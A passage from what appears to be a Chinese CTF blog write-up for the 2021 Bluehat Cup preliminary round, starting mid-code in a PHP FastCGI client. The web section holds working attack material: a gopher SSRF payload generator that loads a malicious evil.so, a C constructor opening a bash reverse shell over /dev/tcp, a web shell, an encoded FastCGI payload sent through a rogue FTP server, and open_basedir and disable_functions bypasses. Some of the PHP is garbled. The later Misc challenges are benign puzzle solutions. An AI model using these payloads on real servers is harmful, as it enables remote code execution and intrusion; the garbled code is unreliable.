+        $ret['requestId']     = (ord($data{2}) &lt;&lt; 8) + ord($data{3});
+        $ret['contentLength'] = (ord($data{4}) &lt;&lt; 8) + ord($data{5});
+        $ret['paddingLength'] = ord($data{6});
+        $ret['reserved']      = ord($data{7});
+        return $ret;
+    }
+    /**
+     * Read a FastCGI Packet
+     *
+     * @return array
+     */
+    private function readPacket()
+    {
+        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) {
+            $resp = $this-&gt;decodePacketHeader($packet);
+            $resp['content'] = '';
+            if ($resp['contentLength']) {
+                $len  = $resp['contentLength'];
+                while ($len &amp;&amp; $buf=fread($thresp['contentLength']) {
+                $len  = $resp['contentL                  $resp['content'] .= $buf;
+                }
+            }
+            if ($resp['paddingLength']) {
+                $buf=fread($this-&gt;_sock, $resp['paddingLength']);
+            }
+            return $resp;
+        } else {
+            return false;
+        }
+    }
+    /**
+     * Get Informations on the FastCGI application
+     *
+     * @param array $requestedInfo information to retrieve
+     * @return array
+     */
+    public function getValues(array $requestedInfo)
+    {
+        $this-&gt;connect();
+        $request = '';
+        foreach ($requestedInfo as $info) {
+            $request .= $this-&gt;buildNvpair($info, '');
+        }
+        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
+        $resp = $this-&gt;readPacket();
+        if ($resp['type'] == self::GET_VALUES_RESULT) {
+            return $this-&gt;readNvpair($resp['content'], $resp['length']);
+        } else {
+            throw new Exception('Unexpected response typ, expecting GET_VALUES_RESULT');
+        }
+    }
+    /**
+     *  Execute a request to the FastCGI application
+     *
+     * @param array $params Array of parameters
+     * @param String $stdin Content
+     * @return String
+     */
+    public function request(array $params, $stdin)
+    {
+        $response = '';
+//        $this-&gt;connect();
+        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0 . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_reppeat(chr(0), 5));
+        $paramsRequest = '';
+        foreach ($params as $key =&gt; $value) {
+            $paramsRequest .= $this-&gt;buildNvpair($key, $value);
+        }
+        if ($paramsRequest) {
+            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
+        }
+        $request .= $this-&gt;buildPacket(self::PARAMS, '');
+        if ($stdin) {
+            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);
+        }
+        $request .= $this-&gt;buildPacket(self::STDIN, '');
+        // 输出构造好的请求
+        return (urlencode($request));
+//        fwrite($this-&gt;_sock, $request);
+//        do {
+//            $resp = $this-&gt;readPacket();
+//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
+//                $response .= $resp['content'];
+//            }
+//        } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);
+//        var_dump($resp);
+//        if (!is_array($resp)) {
+//            throw new Exception('Bad request');
+//        }
+//        switch (ord($resp['content']{4})) {
+//            case self::CANT_MPX_CONN:
+//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
+//                break;
+//            case self::OVERLOADED:
+//                throw new Exception('New request rejected; too busy [OVERLOADED]');
+//                break;
+//            case self::UNKNOWN_ROLE:
+//                throw new Exception('Role value not known [UNKNOWN_ROLE]');
+//                break;
+//            case self::REQUEST_COMPLETE::/                return $response;
+//        }
+    }
+}
+// php5
+
+// ssrf生成payload的话，这里不用管
+$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
+$SCRIPT_FILENAME = '/var/www/html/user.php';
+$SCRIPT_NAME = '/'.basename($SCRIPT_FILENAME);
+// GET参数
+$REQUEST_URI = $SCRIPT_NAME;
+// POST参数
+$content = '';
+// 设置php_value利用php://input执行代码
+// $PHP_ADMIN_VALUE = "allow_url_include=On\nopen_basedir=/\nauto_prepend_file=php://input";
+// 设置php_value加载恶意so文件，把so文件上传到/var/www/html中或其他目录
+$PHP_ADMIN_VALUE = "extension_dir = /var/www/html\nextension = evil.so\n";
+$res = $client-&gt;request(
+                      array(
+                            'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
+                            'REQUEST_METHOD' =&gt; 'POST',
+                            'SCRIPT_FILENAME' =&gt; $SCRIPT_FILENAME,
+                            'SCRIPT_NAME' =&gt; $SCRIPT_NAME,
+                            'REQUEST_URI' =&gt; $REQUEST_URI,
+                            'PHP_ADMIN_VALUE'   =&gt; $PHP_ADMIN_VALUE,
+                            'SERVER_SOFTWARE' =&gt; 'php/fastcgiclient',
+                            'REMOTE_ADDR' =&gt; '127.0.0.1',
+                            'REMOTE_PORT' =&gt; '9985',
+                            'SERVER_ADDR' =&gt; '127.0.0.1',
+                            'SERVER_PORT' =&gt; '80',
+                            'SERVER_NAME' =&gt; 'localhost',
+                            'SERVER_PROTOCOL' =&gt; 'HTTP/1.1',
+                            'CONTENT_TYPE' =&gt; 'application/x-www-form-urlencoded',
+                            'CONTENT_LENGTH' =&gt; strlen($content),
+                                   ),
+                      $content
+                      );
+// 这次也不用二次编码了
+echo('gopher://127.0.0.1:9000/_'.str_replace("%2B", "+", ($res)));</code></pre><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>先写一个扩展</p>
+<pre><code>#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+__attribute__ ((__constructor__)) void preload (void){
+    system("bash -c 'bash -i &gt;&amp; /dev/tcp/xxxx/2333 0&gt;&amp;1'");
+}</code></pre><p>编译</p>
+<pre><code>gcc evil.c -fPIC -shared -o evil.so</code></pre><p>至此我们的恶意so文件生成完毕</p>
+<p>恶意so文件编译好上传后</p>
+<p>开启恶意ftp服务器</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094655.png" alt="image-20210502154725106"></p>
+<p>构造<code>file_put_contents</code></p>
+<pre><code>$file = $_GET['file'];
+$data = $_GET['data'];
+file_put_contents($file,$data);
+//http://7e653797-b723-4b3a-8977-5558bdd011e8.node3.buuoj.cn/shell.php?file=ftp://47.104.134.135:2334/anything&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%A5%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%16SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fuser.php%0B%09SCRIPT_NAME%2Fuser.php%0B%09REQUEST_URI%2Fuser.php%0F2PHP_ADMIN_VALUEextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+evil.so%0A%0F%11SERVER_SOFTWAREphp%2Ffastcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0C%21CONTENT_TYPEapplication%2Fx-www-form-urlencoded%0E%01CONTENT_LENGTH0%01%04%00%01%00%00%00%00%01%05%00%01%00%00%00%00
+//POST:
+//a=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);</code></pre><p>监听端口，发送请求即可收到shell</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094657.png" alt="image-20210502155201812"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094703.png" alt="image-20210502154940239"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094705.png" alt="image-20210502154952216"></p>
+<p>flag没权限</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094715.png" alt="image-20210502155046896"></p>
+<p>使用suid提权，查找有权限的命令</p>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094943.png" alt="image-20210502155438554"></p>
+<p><code>php -a</code>进入交互模式，进行绕过open_basedir并getflag</p>
+<pre><code>chdir('css');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag');</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094718.png" alt="image-20210502155624776"></p>
+<h3 id="更骚的办法"><a href="#更骚的办法" class="headerlink" title="更骚的办法"></a>更骚的办法</h3><p><a target="_blank" rel="noopener" href="http://bubb1e.com/2021/04/29/蓝帽杯2021WP_WEB/#0x02-one-Pointer-php">http://bubb1e.com/2021/04/29/%E8%93%9D%E5%B8%BD%E6%9D%AF2021WP_WEB/#0x02-one-Pointer-php</a></p>
+<p>除了<code>fsockopen</code>这个函数外，还有一个<code>pfsockopen</code></p>
+<p>这俩函数没啥区别</p>
+<p>这里只ban了<code>fsockopen</code></p>
+<p>所以我们可以通过将蚁剑插件中的<code>fsockopen</code>全部替换为<code>pfsockopen</code>达到getshell目的</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094720.png" alt="image-20210503224124644"></p>
+<p>然后加一个9001端口的选项</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094723.png" alt="image-20210503230321062"></p>
+<p>全部修改完后，重启蚁剑，先写个新的一句话<code>shell.php</code></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094725.png" alt="image-20210503224150038"></p>
+<p>用蚁剑连接上这个新的，开启<code>bypass</code>插件</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094728.png" alt="image-20210503230407833"></p>
+<p><code>bypass_php_disable_functions</code>的fpm插件会上传.so文件，然后开启一个新的不使用php.ini的php进程并加载恶意so文件，来达到绕过<code>disable_functions</code>的操作</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094730.png" alt="image-20210503230627747"></p>
+<p>可以看到，蚁剑生成了一个新的<code>.antproxy.php</code></p>
+<p>这个php的作用是把流量转发到新开启的php进程</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094734.png" alt="image-20210503230656027"></p>
+<p>我们修改或新建蚁剑的链接如下</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094737.png" alt="image-20210503230735250"></p>
+<p>成功绕过，并且因为php本身suid有root权限，因此不用提权即可直接读取flag</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094739.png" alt="image-20210503230753903"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094743.png" alt="image-20210503230850304"></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="冬奥会-is-coming"><a href="#冬奥会-is-coming" class="headerlink" title="冬奥会_is_coming"></a>冬奥会_is_coming</h2><p>分离图片，找到压缩包</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094750.png" alt="image-20210429115725329"></p>
+<p>解压出一个MP3，MP3最后面有密文</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094753.png" alt="image-20210429115819092"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094755.png" alt="image-20210429121542312"></p>
+<p>看看压缩包的注释，发现提示</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094759.png" alt="image-20210429120103164"></p>
+<p>考虑题目为<code>冬奥会_is_coming</code>，猜测密码为冬奥会开始日期<code>20220204</code></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094802.png" alt="image-20210429120154731"></p>
+<p>解16进制</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094805.png" alt="image-20210429120549345"></p>
+<p>Google一搜，发现编码类型</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094808.png" alt="image-20210429120712293"></p>
+<p><a target="_blank" rel="noopener" href="https://www.dcode.fr/wingdings-font">https://www.dcode.fr/wingdings-font</a></p>
+<p>解出来这个</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094812.png" alt="image-20210429120908642"></p>
+<p>去github找相应的仓库<code>1cePeak</code></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Tr0jAnV1rU4/1cePeak">https://github.com/Tr0jAnV1rU4/1cePeak</a></p>
+<p>git clone下来，发现有被删除的文件，<code>checkout</code>一下</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094814.png" alt="image-20210429121142295"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094816.png" alt="image-20210429121201233"></p>
+<p>怀疑这是个key，想到第一步从mp3尾部解出的emoji，在线搜一下</p>
+<p><a target="_blank" rel="noopener" href="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/#toc-heading-5">https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/#toc-heading-5</a></p>
+<p><a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p>
+<p>直接解出flag</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094818.png" alt="image-20210429121259016"></p>
+<h2 id="I-will-but-not-quite"><a href="#I-will-but-not-quite" class="headerlink" title="I_will_but_not_quite"></a>I_will_but_not_quite</h2><p>题目给了文件</p>
+<pre class="line-numbers language-Python"><code class="language-Python">#!/user/bin/python2
+import random
+def r(s, num):
+    l=""
+    for i in s:
+        if(ord(i) in range(97,97+26)):
+            l+=chr((ord(i)-97+num)%26+97)
+        else:
+            l+=i
+    return l
+
+def x(a, b):
+    return chr(ord(a)^ord(b))
+
+def encrypt(c):
+    secret = c
+    n=random.randint(1,1000)
+    for i in range(n):
+        secret = r(secret, random.randint(1,26))
+    secret = secret.encode('base64')
+
+    l = ""
+    for i in range(len(secret)):
+        l += x(secret[i], secret[(i+1)%len(secret)])
+    return l.encode('base64')
+
+flag = "#################"
+print "secret =", encrypt(flag)
+
+#secret = The key you got
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>解压出来是Twin.vmem，内存取证</p>
+<p>看系统版本，查文件列表</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094821.png" alt="image-20210503103925802"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094825.png" alt="image-20210503103935712"></p>
+<p>找所有的图片、压缩包，并提取</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094827.png" alt="image-20210503104046011"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094830.png" alt="image-20210503104055200"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094832.png" alt="image-20210503104545231"></p>
+<p>那个倒影.zip是UNCTF的题，不用看了，直接看sea.zip</p>
+<p>sea.zip中有注释：</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094835.png" alt="image-20210503104627426"></p>
+<p>暂时不知道啥意思，直接工具全试一遍，发现是outguess+弱口令</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094840.png" alt="image-20210503105146827"></p>
+<p>双十六进制编码，解出来既是密文</p>
+<p><a target="_blank" rel="noopener" href="https://www.calcresult.com/misc/cyphers/twin-hex.html">https://www.calcresult.com/misc/cyphers/twin-hex.html</a></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094842.png" alt="image-20210503105940728"></p>
+<p>逆加密脚本，得解密脚本</p>
+<pre><code>secret = "Vnw3HC07BDgbBWNRGTx2fSckf399V1Z9CxIvHVd6fHsaEnR8fX40NyQ7JhM8CWV5fgMNN24="
+
+def r(s, num):
+    l = ""
+    for i in s:
+        if(ord(i) in range(97,97+26)):
+            l+=chr((ord(i)-97-num)%26+97)
+        else:
+            l+=i
+    return l
+
+def x(a, b):
+    return chr(ord(a)^ord(b))
+
+secret = secret.decode('base64')
+for i in range(97,123):
+    last_chr = chr(i)
+    tmp_flag = ''
+    tmp_flag += last_chr
+    for j in range(len(secret)):
+        tmp_flag += x(secret[j],tmp_flag[-1])
+    tmp_flag = tmp_flag[:-1]
+    try:
+        tmp_flag = tmp_flag.decode('base64')
+        for k in range(1,26):
+            flag = r(tmp_flag,k)
+            print flag
+    except:
+        pass</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094844.png" alt="image-20210503233833000"></p>
+<h2 id="嫌疑人x的硬盘"><a href="#嫌疑人x的硬盘" class="headerlink" title="嫌疑人x的硬盘"></a>嫌疑人x的硬盘</h2><p>这是取证题？</p>
+<p>给的镜像，有<code>bitlocker</code>，取证大师一把梭就能解</p>
+<p>找出来俩文件</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094450.png" alt="image-20210503234027021"></p>
+<p>逆向不会了</p>
+<p>[参考链接](<a target="_blank" rel="noopener" href="http://www.rayi.vip/2021/05/02/第五届&quot;蓝帽杯&quot;">http://www.rayi.vip/2021/05/02/第五届"蓝帽杯"</a> WriteUp/)</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">lijunliang</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://marmalade.vip/bluehat2021chusai.html">https://marmalade.vip/bluehat2021chusai.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">lijunliang</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/">
+                                    <span class="chip bg-color">蓝帽杯</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">浏览这篇文章感到有所帮助并且忍不住想打赏？</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '3h4PoPOFesTUO42qF2dEBexJ-gzGzoHsz',
+        appKey: 'fTECFrhrH4wGSHmFMaaALtK0',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '想说点啥？Just go go ^_^'
+    });
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/bluehat2021chusai.html">
+                    <div class="card-image">
+                        
+                        <img src="https://gitee.com/marmalade0/images/raw/master/www.marmalade.vip/background/3N_2OON@VASV_9~CI06R)CC.jpg" class="responsive-img" alt="第五届“蓝帽杯” 初赛WriteUp">
+                        
+                        <span class="card-title">第五届“蓝帽杯” 初赛WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/writeup/" class="post-category">
+                                    writeup
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/">
+                        <span class="chip bg-color">蓝帽杯</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/minglingzhixingphpzhengzeraoguo.html">
+                    <div class="card-image">
+                        
+                        <img src="https://gitee.com/marmalade0/images/raw/master/www.marmalade.vip/background/meerkats-6153748_960_720.jpg" class="responsive-img" alt="命令执行中关于PHP正则表达式的一些绕过方法">
+                        
+                        <span class="card-title">命令执行中关于PHP正则表达式的一些绕过方法</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            以[极客大挑战 2019]RCE ME为例，列举一些PHP正则的一些绕过方法
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-25
+                            </span>
+                        <span class="publish-author">
+                            
